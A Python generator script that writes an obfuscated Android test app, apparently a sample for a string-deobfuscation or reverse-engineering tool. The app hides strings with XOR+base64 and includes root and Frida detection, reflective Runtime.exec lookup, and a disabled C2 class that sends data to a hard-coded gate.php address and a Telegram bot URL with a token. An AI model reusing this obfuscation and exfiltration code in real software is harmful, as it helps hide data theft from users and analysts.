"""Sinh source t2: string bị mã hóa XOR+base64 qua Z.a(s, k) (giống StringFog)."""
import base64, os
os.makedirs("src/com/rdict/t2", exist_ok=True)
def enc(s,k):
    return base64.b64encode(bytes((c ^ ((k+i)&0xff)) for i,c in enumerate(s.encode()))).decode()
items=[("RT","java.lang.Runtime",17),("GR","getRuntime",42),("EX","exec",99),("SU","/system/xbin/su",7),
("MAPS","/proc/self/maps",123),("FR","frida-server",55),("C2","http://45.12.33.7:8080/gate.php",201),
("TG","https://api.telegram.org/bot7712345678:AAHk3jXq9Lr2Vt8ZpWm4Ns6Yb1Cd5Ef0Gh/sendMessage",77),
("ECB","AES/ECB/PKCS5Padding",13),("TAG","t2",3)]
S={n:(enc(s,k),k) for n,s,k in items}
def J(n): c,k=S[n]; return f'Z.a("{c}", {k})'
src={}
src["Z"]='''package com.rdict.t2;
public class Z {
    public static String a(String s, int k) {
        byte[] b = android.util.Base64.decode(s, 0);
        for (int i = 0; i < b.length; i++) b[i] = (byte) (b[i] ^ ((k + i) & 0xff));
        return new String(b, java.nio.charset.StandardCharsets.UTF_8);
    }
}'''
src["RootCheck"]=f'''package com.rdict.t2;
public class RootCheck {{
    public static boolean isRooted() {{ return new java.io.File({J("SU")}).exists(); }}
}}'''
src["AntiHook"]=f'''package com.rdict.t2;
import java.io.*;
public class AntiHook {{
    public static boolean scan() {{
        try (BufferedReader r = new BufferedReader(new FileReader({J("MAPS")}))) {{
            String l; String needle = {J("FR")};
            while ((l = r.readLine()) != null) if (l.contains(needle)) return true;
        }} catch (IOException e) {{ }}
        return false;
    }}
}}'''
src["C2"]=f'''package com.rdict.t2;
public class C2 {{
    public static void send(String data) throws Exception {{
        java.net.HttpURLConnection c = (java.net.HttpURLConnection) new java.net.URL({J("C2")}).openConnection();
        c.setDoOutput(true); c.getOutputStream().write(data.getBytes());
        new java.net.URL({J("TG")}).openConnection().connect();
    }}
}}'''
src["Crypt"]=f'''package com.rdict.t2;
import javax.crypto.Cipher;
public class Crypt {{
    public static Cipher make() throws Exception {{ return Cipher.getInstance({J("ECB")}); }}
}}'''
src["MainActivity"]=f'''package com.rdict.t2;
import android.app.Activity; import android.os.Bundle; import android.widget.TextView;
public class MainActivity extends Activity {{
    @Override protected void onCreate(Bundle b) {{
        super.onCreate(b);
        StringBuilder sb = new StringBuilder("rdict test2\\n");
        sb.append("rooted=").append(RootCheck.isRooted()).append("\\n");
        sb.append("frida=").append(AntiHook.scan()).append("\\n");
        try {{
            Class<?> c = Class.forName({J("RT")});
            Object rt = c.getMethod({J("GR")}).invoke(null);
            java.lang.reflect.Method m = c.getMethod({J("EX")}, String.class);
            sb.append("resolved=").append(m.getName()).append("\\n");
            Crypt.make();
            if (System.currentTimeMillis() < 0) C2.send("x");
        }} catch (Exception e) {{ sb.append(e); }}
        android.util.Log.d({J("TAG")}, sb.toString());
        TextView t = new TextView(this); t.setText(sb); setContentView(t);
    }}
}}'''
for n,c in src.items(): open(f"src/com/rdict/t2/{n}.java","w").write(c)
open("AndroidManifest.xml","w").write('''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.rdict.t2" android:versionCode="1" android:versionName="1.0">
  <uses-sdk android:minSdkVersion="24" android:targetSdkVersion="34"/>
  <application android:label="rdict-t2">
    <activity android:name=".MainActivity" android:exported="true">
      <intent-filter><action android:name="android.intent.action.MAIN"/><category android:name="android.intent.category.LAUNCHER"/></intent-filter>
    </activity>
  </application>
</manifest>''')
